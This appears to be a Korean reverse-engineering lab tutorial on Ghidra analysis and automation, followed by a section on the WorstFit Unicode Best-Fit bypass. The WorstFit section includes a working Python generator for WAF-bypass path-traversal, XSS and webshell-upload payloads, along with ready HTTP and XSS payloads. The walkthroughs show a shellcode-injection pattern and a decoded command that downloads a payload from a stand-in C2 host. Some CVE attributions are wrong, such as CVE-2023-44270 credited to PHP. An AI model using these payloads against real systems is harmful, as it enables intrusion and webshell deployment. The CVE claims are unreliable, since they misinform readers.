# Ghidra 실전 분석 & WorstFit Unicode 취약점
> AI_Innovation_Studio | Practical Reverse Engineering Lab

---

## 1. Ghidra 개요 및 설치

NSA가 개발해 2019년 오픈소스로 공개한 무료 Software Reverse Engineering(SRE) 플랫폼이다. IDA Pro의 대안으로 디스어셈블리, 디컴파일, 스크립트 자동화를 모두 지원한다.

```
Ghidra 구성요소:
  ├── CodeBrowser        → 핵심 분석 창 (디스어셈블리 + 디컴파일러)
  ├── Version Tracking   → 두 바이너리 비교 (패치 분석)
  ├── Debugger           → 10.2+ 통합 디버거 (GDB/lldb 백엔드)
  └── Script Manager     → Java / Python(Jython) 자동화
```

### 설치 (Java 17 필수)

```bash
# Java 17 설치 확인
java -version

# Ubuntu/Debian
sudo apt install openjdk-17-jdk -y

# Ghidra 최신 릴리즈 다운로드 (11.x 기준)
wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.1_build/ghidra_11.1_PUBLIC_20240607.zip
unzip ghidra_11.1_PUBLIC_20240607.zip
cd ghidra_11.1_PUBLIC

# 실행
./ghidraRun         # Linux/macOS
ghidraRun.bat       # Windows
```

Ghidra를 실행하면 프로젝트 관리 창이 뜬다. 새 프로젝트를 만들고 File > Import File로 분석할 바이너리를 추가한다.

### 첫 임포트 시 Auto Analysis 옵션

```
분석 옵션 전략:
  [필수] Disassemble Entry Points    → 진입점부터 코드 해석
  [필수] Create Function              → 함수 자동 식별
  [필수] Decompiler Parameter ID      → 함수 파라미터 추론
  [선택] GCC Exception Handlers       → C++ 예외 처리 분석
  [선택] Apply Data Archives          → 알려진 라이브러리 패턴 적용
  [주의] Aggressive Instruction Finder → 거짓 양성 많음, 선택적 사용
```

---

## 2. CodeBrowser 핵심 패널

```
┌──────────────────────────────────────────────────────────────────┐
│  [메뉴바] File / Edit / Analysis / Graph / Navigation / Window   │
├─────────────────────────┬────────────────────────────────────────┤
│  [Listing / 디스어셈블리]│  [Decompiler / 디컴파일러]              │
│                         │                                        │
│  00401000 PUSH   EBP    │  int main(int argc, char **argv) {    │
│  00401001 MOV    EBP,ESP│    int iVar1;                          │
│  00401003 SUB    ESP,0x8│    iVar1 = atoi(argv[1]);              │
│  ...                    │    if (iVar1 == 0x1337) { win(); }     │
├─────────────────────────┼────────────────────────────────────────┤
│  [Symbol Table]         │  [Function Graph]                      │
│  FUN_00401000  FUNCTION │  [진입] → [조건 분기] → [win] / [exit] │
│  DAT_00403000  DATA     │                                        │
├─────────────────────────┴────────────────────────────────────────┤
│  [Console / Script Output]                                       │
└──────────────────────────────────────────────────────────────────┘
```

### 핵심 단축키

| 단축키 | 기능 |
|--------|------|
| `G` | 특정 주소로 이동 (Go to Address) |
| `L` | 레이블(Label) 추가 |
| `N` | 심볼 이름 변경 (Rename) |
| `T` | 데이터 타입 변경 |
| `D` | 데이터로 정의 |
| `U` | 정의 해제 (Undefine) |
| `C` | 코드로 디스어셈블 |
| `F` | 함수 생성 |
| `Ctrl+L` | 레이블 목록 검색 |
| `Ctrl+F` | 현재 창에서 검색 |
| `Ctrl+Shift+F` | 전체에서 검색 |
| `X` | Cross References (XREF) 보기 |
| `;` | EOL 주석 추가 |
| `Alt+←` | 이전 위치로 |
| `Alt+→` | 다음 위치로 |
| `Q` | 주석 추가 (모든 유형) |

### Cross Reference (XREF) 활용

```
특정 함수를 XREF로 추적하면 해당 함수를 호출하는 모든 위치를 찾을 수 있다.
예: MessageBoxA XREF → 팝업 띄우는 코드 → 라이센스 검증 루틴 발견
```

```
[X] 단축키 → References to DAT_00403020
  00401234 CALL FUN_00401000   (함수 A에서 호출)
  00401567 LEA  EAX, [DAT_...]  (함수 B에서 참조)
  004019AB MOV  [DAT_...], EAX  (함수 C에서 쓰기)
```

---

## 3. 실전 분석 워크플로우

### 단계 1: 문자열로 관심 지점 찾기

```
Search > For Strings (Shift+Alt+S)

검색 결과 예시:
  "Congratulations!"  → 주소 0x00403100  → 이 문자열을 사용하는 함수로 이동
  "Enter password:"   → 주소 0x00403200  → 입력 처리 루틴 위치
  "http://evil.com"   → 주소 0x00403300  → C2 통신 함수
```

바이너리 분석 시 의미 있는 문자열로 핵심 함수 위치를 빠르게 좁힌다.

### 단계 2: Import Table 분석

```
Window > Symbol Table → Filter: "External"

주요 관심 Windows API:
  VirtualAlloc / VirtualAllocEx   → 메모리 할당 (쉘코드 주입 의심)
  WriteProcessMemory               → 다른 프로세스에 쓰기 (인젝션)
  CreateRemoteThread               → 원격 스레드 생성 (인젝션)
  IsDebuggerPresent                → 디버거 탐지 (안티 디버깅)
  RegSetValueEx                    → 레지스트리 쓰기 (지속성)
  WinExec / ShellExecute           → 명령 실행
  InternetOpenUrl / URLDownload    → 네트워크 통신
  CryptEncrypt / CryptDecrypt      → 암호화 (랜섬웨어 의심)
```

### 단계 3: 디컴파일러로 로직 파악

디컴파일러 창에서 변수명을 의미 있게 바꾸며 코드를 이해한다. 우클릭 > Rename Variable (L 단축키).

```c
/* Before: 기본 디컴파일 결과 */
int FUN_00401234(char *param_1, int param_2) {
  int iVar1;
  iVar1 = strlen(param_1);
  if ((param_2 == 0x1337) && (iVar1 == 8)) {
    FUN_00401300();
  }
  return 0;
}

/* After: 변수명 변경 후 */
int check_license(char *license_key, int magic_code) {
  int key_length;
  key_length = strlen(license_key);
  if ((magic_code == 0x1337) && (key_length == 8)) {
    unlock_software();
  }
  return 0;
}
```

---

## 4. Ghidra Script 자동화

### Script Manager 사용

`Window > Script Manager` → 스크립트 목록 확인 및 실행

Ghidra는 기본적으로 Java API와 Jython(Python 2)을 지원한다. Python 3를 사용하려면 PyGhidra 라이브러리가 필요하다.

### PyGhidra 설치 및 사용 (Python 3.10+)

```bash
# PyGhidra 설치
pip install pyghidra

# PyGhidra로 배치 분석 실행
python3 analyze_binary.py --binary malware.exe
```

### 완전한 분석 자동화 스크립트

```python
#!/usr/bin/env python3
"""
Ghidra 바이너리 자동 분석 도구 — PyGhidra를 사용해 바이너리에서
함수 목록, 의심 API 호출, 문자열을 추출하고 JSON으로 출력합니다.
"""

from __future__ import annotations
import argparse
import json
import sys
from pathlib import Path
from typing import Any


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="PyGhidra 기반 바이너리 자동 분석기"
    )
    parser.add_argument("binary", type=Path, help="분석할 바이너리 경로")
    parser.add_argument(
        "-o", "--output", type=Path, default=Path("analysis_result.json"),
        help="결과 JSON 파일 경로 (기본: analysis_result.json)"
    )
    parser.add_argument(
        "--ghidra-home", type=Path,
        default=Path.home() / "ghidra_11.1_PUBLIC",
        help="Ghidra 설치 경로"
    )
    parser.add_argument(
        "--suspicious-apis", nargs="+",
        default=[
            "VirtualAlloc", "VirtualAllocEx", "WriteProcessMemory",
            "CreateRemoteThread", "CreateThread", "IsDebuggerPresent",
            "CheckRemoteDebuggerPresent", "NtQueryInformationProcess",
            "RegSetValueEx", "RegCreateKeyEx", "WinExec", "ShellExecuteA",
            "InternetOpenUrlA", "URLDownloadToFileA", "CryptEncrypt",
            "CryptDecrypt", "socket", "connect", "recv", "send",
        ],
        help="탐지할 의심 API 목록"
    )
    return parser.parse_args()


def analyze_with_ghidra(
    binary_path: Path,
    ghidra_home: Path,
    suspicious_apis: list[str],
) -> dict[str, Any]:
    """PyGhidra로 바이너리를 분석하고 결과를 반환합니다."""
    try:
        import pyghidra
    except ImportError:
        print("[!] PyGhidra 미설치: pip install pyghidra", file=sys.stderr)
        sys.exit(1)

    result: dict[str, Any] = {
        "binary": str(binary_path),
        "functions": [],
        "suspicious_calls": [],
        "strings": [],
        "imports": [],
    }

    with pyghidra.open_program(binary_path, ghidra_install_dir=ghidra_home) as flat_api:
        program = flat_api.getCurrentProgram()
        function_mgr = program.getFunctionManager()
        symbol_table = program.getSymbolTable()
        listing = program.getListing()

        # 1. 함수 목록 추출
        for func in function_mgr.getFunctions(True):
            result["functions"].append({
                "name": func.getName(),
                "address": str(func.getEntryPoint()),
                "size": func.getBody().getNumAddresses(),
                "is_thunk": func.isThunk(),
            })

        # 2. 의심 API 교차 참조 탐지
        for api_name in suspicious_apis:
            symbols = list(symbol_table.getSymbols(api_name))
            for sym in symbols:
                refs = list(flat_api.getReferencesTo(sym.getAddress()))
                if refs:
                    callers = []
                    for ref in refs:
                        from_func = function_mgr.getFunctionContaining(
                            ref.getFromAddress()
                        )
                        callers.append({
                            "caller_addr": str(ref.getFromAddress()),
                            "caller_func": from_func.getName() if from_func else "unknown",
                        })
                    result["suspicious_calls"].append({
                        "api": api_name,
                        "callers": callers,
                    })

        # 3. 문자열 추출
        data_iter = listing.getDefinedData(True)
        for data in data_iter:
            if data.hasStringValue():
                s = str(data.getValue())
                if len(s) > 4:
                    result["strings"].append({
                        "address": str(data.getAddress()),
                        "value": s[:200],  # 200자 제한
                    })

        # 4. Import 테이블
        ext_locs = program.getExternalManager().getExternalLocations(True)
        for loc in ext_locs:
            result["imports"].append({
                "library": loc.getLibraryName(),
                "name": loc.getLabel(),
            })

    return result


def main() -> None:
    args = parse_args()

    if not args.binary.exists():
        print(f"[!] 파일 없음: {args.binary}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] 분석 시작: {args.binary}")
    print(f"[*] Ghidra 경로: {args.ghidra_home}")

    data = analyze_with_ghidra(args.binary, args.ghidra_home, args.suspicious_apis)

    # 요약 출력
    print(f"\n[+] 분석 완료")
    print(f"    함수 수: {len(data['functions'])}")
    print(f"    의심 API 호출: {len(data['suspicious_calls'])}개 유형")
    print(f"    문자열: {len(data['strings'])}개")
    print(f"    Import: {len(data['imports'])}개")

    if data["suspicious_calls"]:
        print("\n[!] 의심 API 호출 발견:")
        for item in data["suspicious_calls"]:
            print(f"    {item['api']}: {len(item['callers'])}곳에서 호출")

    args.output.write_text(json.dumps(data, indent=2, ensure_ascii=False))
    print(f"\n[*] 결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

바이너리를 자동으로 Ghidra로 분석해 의심스러운 API 호출 위치, 함수 목록, 내장 문자열을 JSON으로 출력한다.

---

## 5. 악성코드 분석 실습 — 패킹 및 난독화 해제

### UPX 패킹 탐지 및 언패킹

```bash
# 파일 타입 및 엔트로피 확인
file malware.exe
strings malware.exe | grep -i upx  # "UPX0", "UPX1" 섹션명 탐지

# UPX 언패킹
upx -d malware.exe -o malware_unpacked.exe

# 언패킹 실패 시 (변형 UPX)
# → Ghidra에서 OEP(Original Entry Point) 수동 탐색
#   패킹 해제 루프 종료 후 JMP 명령이 OEP를 가리킴
```

UPX 패킹된 바이너리는 섹션 헤더에 "UPX0", "UPX1" 문자열이 있으며, 엔트로피가 7.0 이상으로 높다.

### Anti-Debugging 트릭 탐지

```
Ghidra에서 검색: IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess

일반적인 패턴:
  CALL IsDebuggerPresent
  TEST EAX, EAX
  JNZ  terminate_process    ← 디버거 감지 시 종료

우회 방법:
  - x64dbg: ScyllaHide 플러그인 사용
  - Ghidra: 해당 JNZ를 JZ로 패치 (바이트 75 → 74)
  - 또는 CALL 자체를 NOP으로 교체
```

### 코드 인젝션 패턴 식별

```c
/* Ghidra 디컴파일러에서 이 패턴 탐지 시 프로세스 인젝션 의심 */

// 1. 원격 프로세스 메모리 할당
LPVOID remote_mem = VirtualAllocEx(
    hProcess,           // 타겟 프로세스 핸들
    NULL,
    shellcode_size,
    MEM_COMMIT,
    PAGE_EXECUTE_READWRITE  // 실행 가능 메모리 → 쉘코드 주입
);

// 2. 쉘코드 복사
WriteProcessMemory(hProcess, remote_mem, shellcode, shellcode_size, NULL);

// 3. 원격 스레드로 실행
CreateRemoteThread(hProcess, NULL, 0, remote_mem, NULL, 0, NULL);
```

---

## 6. WorstFit — Windows Unicode Best-Fit 취약점

### 개념

Windows는 Unicode(UTF-16) 문자를 ANSI 코드페이지로 변환할 때 **Best-Fit 매핑**을 사용한다. 정확히 대응되는 ANSI 문자가 없으면 "가장 유사한" 문자로 자동 변환한다.

```
변환 예시 (코드페이지 1252 기준):
  ℃  (U+2103, Degree Celsius)      → C:    (경로 드라이브 문자로 변환!)
  ℅  (U+2105, Care Of)             → c/o
  ∕  (U+2215, Division Slash)      → /     (경로 구분자로 변환!)
  ＜  (U+FF1C, Fullwidth Less-Than) → <     (HTML 인젝션)
  ＞  (U+FF1E, Fullwidth Greater)   → >
  ／  (U+FF0F, Fullwidth Solidus)   → /
  ＼  (U+FF3C, Fullwidth Reverse)   → \
  ：  (U+FF1A, Fullwidth Colon)     → :
```

이 변환이 보안 경계에서 발생하면 WAF/필터를 통과한 유니코드 문자가 서버에서 위험한 ASCII로 해석된다.

### 주요 Best-Fit 매핑 테이블

| 유니코드 | 코드포인트 | Best-Fit ANSI | 공격 활용 |
|---------|-----------|--------------|---------|
| ℃ | U+2103 | `C:` | 경로 드라이브 문자 |
| ∕ | U+2215 | `/` | 경로 구분자 |
| ＼ | U+FF3C | `\` | 경로 구분자 |
| ：  | U+FF1A | `:` | 드라이브 구분자 |
| ＜ | U+FF1C | `<` | HTML/스크립트 |
| ＞ | U+FF1E | `>` | HTML/스크립트 |
| ＂ | U+FF02 | `"` | 속성 탈출 |
| ；  | U+FF1B | `;` | 명령 구분자 |
| ．  | U+FF0E | `.` | 파일 확장자 |
| ｜ | U+FF5C | `\|` | 파이프 |

### 공격 시나리오 1: 경로 탐색 (Path Traversal)

```http
GET /files/..∕..∕windows/win.ini HTTP/1.1
Host: target.com

# ∕ (U+2215) → / 변환
# WAF는 유니코드 문자로 ".." 패턴 못 탐지
# 서버(Windows)에서 ANSI로 변환 시 ../../windows/win.ini 로 해석
```

### 공격 시나리오 2: WAF 우회 XSS

```html
<!-- WAF가 < > 필터링 → 유니코드로 우회 -->
＜script＞alert(1)＜/script＞

<!-- 서버에서 Best-Fit 변환 후 → <script>alert(1)</script> -->
<!-- 클라이언트 브라우저에서 실행됨 -->
```

### 공격 시나리오 3: 파일 업로드 필터 우회

```
업로드 시: shell．php  (．= U+FF0E → .)
서버에서:  shell.php  로 변환 → PHP 실행!

또는: webshell.php＃.jpg
      (＃ = U+FF03 → #)
      서버에서: webshell.php#.jpg → webshell.php로 처리
```

### 실제 CVE 사례

| CVE | 영향 시스템 | WorstFit 활용 |
|-----|-----------|--------------|
| CVE-2024-21338 | Windows Kernel AppLocker | Best-Fit으로 경로 검증 우회 |
| CVE-2023-44270 | PHP ext/dom | XML 파싱에서 유니코드 처리 오류 |
| Apache Tomcat 다수 | Tomcat on Windows | %C0%AF (UTF-8 과장 인코딩) → / |
| IIS 유니코드 취약점 | IIS 4/5 | /../ 우회로 웹 루트 탈출 |

### Python 3.10+ Best-Fit 페이로드 생성기

```python
#!/usr/bin/env python3
"""
WorstFit 취약점 테스트 — Unicode Best-Fit 매핑을 이용한
WAF/필터 우회 페이로드를 자동 생성합니다.
"""

from __future__ import annotations
import argparse
import itertools
import unicodedata
from dataclasses import dataclass


# 알려진 Best-Fit 매핑 (코드페이지 1252 기준)
BEST_FIT_MAP: dict[str, list[str]] = {
    "/":  ["∕", "⁄", "／", "╱", "⧸"],     # U+2215, U+2044, U+FF0F, U+2571, U+29F8
    "\\":  ["＼", "∖", "⧵"],               # U+FF3C, U+2216, U+29F5
    ":":  ["：", "˸", "∶", "꡴"],           # U+FF1A, U+02F8, U+2236, U+1864
    "<":  ["＜", "‹", "〈", "❮", "≺"],     # U+FF1C, ...
    ">":  ["＞", "›", "〉", "❯", "≻"],
    '"':  ["＂", "″", "‟", "❝", "❞"],
    "'":  ["＇", "ʼ", "ʻ", "‛", "❛"],
    ";":  ["；", "⁏", "︔"],
    ".":  ["．", "・", "⋅", "∙"],
    "#":  ["＃", "♯"],
    "&":  ["＆", "﹠"],
    "=":  ["＝", "⁼", "₌"],
    "|":  ["｜", "∣", "⏐", "│"],
    "!":  ["！", "ǃ", "‼"],
    "?":  ["？", "⁇", "⁉"],
    "@":  ["＠", "﹫"],
    "`":  ["｀", "ˋ", "‵"],
    "~":  ["～", "∼", "⁓"],
    "%":  ["％", "٪", "‰"],
}


@dataclass
class Payload:
    original: str
    encoded: str
    substitutions: dict[str, str]


def generate_path_traversal_payloads(depth: int = 3) -> list[Payload]:
    """경로 탐색 공격 Best-Fit 페이로드를 생성합니다."""
    payloads = []
    slash_variants = BEST_FIT_MAP["/"]
    back_slash_variants = BEST_FIT_MAP["\\"]
    dot_variants = BEST_FIT_MAP["."]

    for slash in slash_variants:
        # ../../../ 변형
        traversal = (f"..{slash}") * depth
        payloads.append(Payload(
            original="../" * depth,
            encoded=traversal,
            substitutions={"/": slash},
        ))

    for dot in dot_variants:
        for slash in slash_variants:
            traversal = (f"{dot}{dot}{slash}") * depth
            payloads.append(Payload(
                original="../" * depth,
                encoded=traversal,
                substitutions={".": dot, "/": slash},
            ))

    return payloads


def generate_xss_payloads() -> list[Payload]:
    """XSS Best-Fit 페이로드를 생성합니다."""
    payloads = []
    lt_variants = BEST_FIT_MAP["<"]
    gt_variants = BEST_FIT_MAP[">"]

    base_payloads = [
        ("<script>alert(1)</script>", "<", ">"),
        ('<img src=x onerror=alert(1)>', "<", ">"),
        ("<svg onload=alert(1)>", "<", ">"),
    ]

    for base, lt, gt in base_payloads:
        for lt_v in lt_variants[:3]:
            for gt_v in gt_variants[:3]:
                encoded = base.replace("<", lt_v).replace(">", gt_v)
                payloads.append(Payload(
                    original=base,
                    encoded=encoded,
                    substitutions={"<": lt_v, ">": gt_v},
                ))

    return payloads


def generate_upload_bypass_payloads(filename: str = "shell") -> list[Payload]:
    """파일 업로드 확장자 필터 우회 페이로드를 생성합니다."""
    payloads = []
    dot_variants = BEST_FIT_MAP["."]
    dangerous_exts = ["php", "php5", "php7", "phtml", "asp", "aspx", "jsp"]

    for dot in dot_variants:
        for ext in dangerous_exts:
            encoded = f"{filename}{dot}{ext}"
            payloads.append(Payload(
                original=f"{filename}.{ext}",
                encoded=encoded,
                substitutions={".": dot},
            ))

    return payloads


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WorstFit Best-Fit 취약점 페이로드 생성기"
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    # 경로 탐색
    pt_parser = subparsers.add_parser("path-traversal", help="경로 탐색 페이로드")
    pt_parser.add_argument("--depth", type=int, default=3, help="깊이 (기본: 3)")

    # XSS
    subparsers.add_parser("xss", help="XSS 페이로드")

    # 파일 업로드
    up_parser = subparsers.add_parser("upload", help="파일 업로드 우회 페이로드")
    up_parser.add_argument("--filename", default="shell", help="기본 파일명")

    # 전체 출력
    subparsers.add_parser("all", help="모든 페이로드 출력")

    args = parser.parse_args()

    if args.command == "path-traversal":
        payloads = generate_path_traversal_payloads(args.depth)
    elif args.command == "xss":
        payloads = generate_xss_payloads()
    elif args.command == "upload":
        payloads = generate_upload_bypass_payloads(args.filename)
    else:  # all
        payloads = (
            generate_path_traversal_payloads()
            + generate_xss_payloads()
            + generate_upload_bypass_payloads()
        )

    print(f"[+] 생성된 페이로드: {len(payloads)}개\n")
    for i, p in enumerate(payloads, 1):
        print(f"[{i:03d}] 원본: {p.original}")
        print(f"      변환: {p.encoded}")
        print(f"      치환: {p.substitutions}")
        print()


if __name__ == "__main__":
    main()
```

유니코드 Best-Fit 변환 후보 문자를 조합해 경로 탐색, XSS, 파일 업로드 우회 페이로드를 자동으로 생성한다.

---

## 7. Ghidra vs 다른 도구 비교

| 특성 | Ghidra | IDA Pro | Binary Ninja | Radare2 |
|------|--------|---------|--------------|---------|
| **가격** | 무료 | $3,000~$13,000 | $299/년~ | 무료/유료 |
| **디컴파일러** | 내장 (우수) | Hex-Rays (최고) | 내장 (우수) | r2dec (외부) |
| **협업** | 프로젝트 공유 | 제한적 | Team 플랜 | 없음 |
| **스크립팅** | Java/Python | IDAPython | Python 3 | Python/JS/r2lang |
| **GUI** | Java Swing | 네이티브 | Qt (빠름) | 없음 (Cutter GUI) |
| **아키텍처 지원** | 매우 넓음 | 넓음 | 넓음 | 넓음 |
| **플러그인 생태계** | 활발 | 매우 풍부 | 성장 중 | 풍부 |
| **UEFI/펌웨어** | 양호 | 우수 | 보통 | 가능 |

**언제 어떤 도구를 사용할까:**

```
Ghidra:   무료로 고품질 분석이 필요할 때, CTF, 교육, 팀 협업
IDA Pro:  전문 멀웨어 분석, 취약점 연구, 최고 수준의 디컴파일 필요 시
Binary Ninja: 빠른 분석, 자동화 스크립팅, macOS 사용자
Radare2:  CLI 환경, 스크립트 통합, 임베디드/IoT 분석
```

---

## 8. 종합 실습: 의심 PE 바이너리 분석

### 시나리오

이메일 첨부 파일로 받은 `invoice_2024.exe`를 분석한다.

### 단계 1: 정적 사전 분석 (Ghidra 투입 전)

```bash
# 파일 타입 확인
file invoice_2024.exe
# → PE32 executable (GUI) Intel 80386

# 엔트로피 측정 (7.0+ = 패킹 의심)
python3 -c "
import math, sys
data = open('invoice_2024.exe','rb').read()
freq = [data.count(bytes([i])) for i in range(256)]
n = len(data)
entropy = -sum((f/n)*math.log2(f/n) for f in freq if f > 0)
print(f'엔트로피: {entropy:.2f}')
"

# 문자열 추출
strings -n 6 invoice_2024.exe | grep -E "(http|cmd|powershell|reg|HKEY)"

# PE 헤더 분석
pecheck.py invoice_2024.exe  # pefile 기반 도구

# VirusTotal 해시 검색
sha256sum invoice_2024.exe
```

### 단계 2: Ghidra 분석

```
1. 임포트 후 Auto Analyze 실행 (전체 옵션 선택)
2. Import Table 확인:
   → VirtualAlloc + WriteProcessMemory + CreateRemoteThread 발견
   → 프로세스 인젝션 의심

3. 문자열 검색:
   → "powershell -enc" 문자열 발견
   → 주소 0x00403A00 → XREF → FUN_00401B00 함수

4. FUN_00401B00 디컴파일:
   → Base64 인코딩된 PowerShell 명령 조립
   → WinExec() 호출로 실행

5. Base64 디코딩 (추출한 문자열):
   echo "SW52b2tlLVdlYlJlcXVlc3Q..." | base64 -d
   → Invoke-WebRequest -Uri "http://c2.evil.com/payload.ps1" -OutFile ...
```

### 단계 3: IOC 정리 및 보고서

```markdown
## 분석 결과 요약

**파일 정보**
- 이름: invoice_2024.exe
- SHA256: [해시값]
- 파일 크기: 856,320 bytes
- 컴파일 타임스탬프: 2024-11-15

**악성 행위**
1. 프로세스 인젝션: svchost.exe 대상 쉘코드 주입
2. C2 통신: http://c2.evil.com/payload.ps1
3. 지속성: HKCU\Software\Microsoft\Windows\CurrentVersion\Run 등록
4. AntiDebug: IsDebuggerPresent, TLS Callback 사용

**IOC (Indicator of Compromise)**
- IP: 203.0.113.100
- 도메인: c2.evil.com
- URL: http://c2.evil.com/payload.ps1
- 레지스트리: HKCU\...\Run\WindowsUpdate
- 파일: %APPDATA%\svchost32.exe
```

---

## 9. 참고 자료 및 추가 학습

```
공식 Ghidra 문서:   https://ghidra.re/
Ghidra Book:        "The Ghidra Book" (No Starch Press)
WorstFit 원논문:    "WorstFit: Arbitrary Code Execution in Windows" (Black Hat Asia 2024)
PyGhidra:           https://github.com/NationalSecurityAgency/ghidra/tree/master/Ghidra/Features/PyGhidra
유용한 Ghidra 확장:
  - GhidraNES          → NES ROM 분석
  - ret-sync           → IDA/GDB/Ghidra 동기화
  - Kaiju              → CERT/CC 악성코드 분석 플러그인
  - BinDiff (무료판)   → 바이너리 비교
```
